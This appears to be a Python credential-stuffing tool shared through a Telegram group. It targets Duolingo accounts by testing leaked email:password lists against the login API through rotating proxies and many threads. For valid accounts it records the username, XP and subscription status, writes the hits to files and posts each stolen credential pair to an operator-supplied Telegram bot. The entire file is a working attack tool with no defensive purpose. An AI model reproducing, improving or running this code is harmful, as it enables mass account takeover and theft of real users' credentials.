# TreTrau Network 
# Link : https://t.me/+QWRoc1op3xYxMWU9

import os
os.system("pip install rich")
os.system("pip install requests")
import requests
import json
import threading
import time
import queue
import random
from rich.console import Console
from rich.table import Table

console = Console()
lock = threading.Lock()

checked = hits = bad = 0
start_time = time.time()

# ✅ Telegram gönderim fonksiyonu
def send_to_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        console.print(f"[red]Telegram gönderim hatası:[/red] {e}")

def print_stats(total, proxy_count, threads_num):
    global checked, hits, bad
    elapsed = int(time.time() - start_time)
    cpm = int(checked / elapsed * 60) if elapsed > 0 else 0

    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Total Combos", style="bold")
    table.add_column("Proxy", style="cyan")
    table.add_column("Checked", justify="center")
    table.add_column("Hits", style="green", justify="center")
    table.add_column("Bad", style="red", justify="center")
    table.add_column("CPM", style="bright_cyan", justify="center")
    table.add_column("Threads", style="bright_white", justify="center")
    table.add_column("Time", style="dim", justify="center")

    table.add_row(str(total), str(proxy_count), str(checked), str(hits), str(bad), str(cpm), str(threads_num), str(elapsed) + "s")
    
    console.clear()
    console.print(table)

def get_proxy_dict(proxy):
    parts = proxy.split(":")
    if len(parts) == 2:
        ip, port = parts
        return {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return {
            "http": f"http://{user}:{pwd}@{ip}:{port}",
            "https": f"http://{user}:{pwd}@{ip}:{port}"
        }
    return None

def check_account(email, password, proxy_raw, telegram_token, chat_id):
    global checked, hits, bad

    try:
        session = requests.Session()
        proxy_dict = get_proxy_dict(proxy_raw)
        id_guid = "123e4567-e89b-12d3-a456-426614174000"
        headers = {
            "Host": "android-api-cf.duolingo.com",
            "User-Agent": "Duodroid/5.141.4 Dalvik/2.1.0 (Linux; Android 9; SM-G955N)",
            "Accept": "application/json",
            "X-Amzn-Trace-Id": "User=0",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json"
        }
        data = {
            "distinctId": id_guid,
            "identifier": email,
            "password": password
        }

        res = session.post("https://es.duolingo.com/2017-06-30/login?fields=id",
                           headers=headers,
                           json=data,
                           proxies=proxy_dict,
                           timeout=10)

        with lock:
            checked += 1

        if '"id":' in res.text:
            uid = res.json().get("id")
            profile_res = session.get(
                f"https://android-api-cf.duolingo.com/2017-06-30/users/{uid}?fields=id,username,totalXp,hasPlus",
                headers=headers,
                proxies=proxy_dict,
                timeout=10
            )
            profile = profile_res.json()
            username = profile.get("username", "N/A")
            totalXp = profile.get("totalXp", "0")
            hasPlus = profile.get("hasPlus", False)

            with lock:
                hits += 1
                console.print(f"[green][HIT][/green] {email}:{password} | {username} | XP: {totalXp} | Plus: {hasPlus}")
                msg = f"[HIT] {email}:{password} | {username} | XP: {totalXp} | Plus: {hasPlus}"
                send_to_telegram(telegram_token, chat_id, msg)
                if hasPlus:
                    with open("duolingo_super.txt", "a") as f:
                        f.write(f"{email}:{password} | {username} | XP: {totalXp} | Plus: True\n")
                else:
                    with open("duolingo_hits.txt", "a") as f:
                        f.write(f"{email}:{password} | {username} | XP: {totalXp} | Plus: False\n")
        else:
            with lock:
                bad += 1
    except:
        with lock:
            checked += 1
            bad += 1

def worker(combo_q, proxy_list, telegram_token, chat_id):
    while not combo_q.empty():
        try:
            combo = combo_q.get_nowait()
        except queue.Empty:
            return
        try:
            email, password = combo.strip().split(":", 1)
            proxy = random.choice(proxy_list)
            check_account(email, password, proxy, telegram_token, chat_id)
        except:
            with lock:
                global checked, bad
                checked += 1
                bad += 1
            continue

def main():
    os.system("cls" if os.name == "nt" else "clear")

    combo_file = input("Combo file: ").strip()
    proxy_file = input("Proxy file: ").strip()
    telegram_token = input("Telegram Bot Token: ").strip()
    chat_id = input("Telegram Chat ID: ").strip()
    threads_num = int(input("Threads (default 50): ") or "50")

    with open(combo_file, "r") as f:
        combos = [line.strip() for line in f if ":" in line]

    with open(proxy_file, "r") as f:
        proxies = [line.strip() for line in f if ":" in line]

    total = len(combos)
    proxy_count = len(proxies)

    combo_q = queue.Queue()
    for combo in combos:
        combo_q.put(combo)

    thread_list = []
    for _ in range(threads_num):
        t = threading.Thread(target=worker, args=(combo_q, proxies, telegram_token, chat_id))
        t.start()
        thread_list.append(t)

    while any(t.is_alive() for t in thread_list):
        print_stats(total, proxy_count, threads_num)
        time.sleep(3)

    print_stats(total, proxy_count, threads_num)
    console.print("[bold green]Done! Hits saved in duolingo_hits.txt and duolingo_super.txt[/bold green]")

if __name__ == "__main__":
    main()
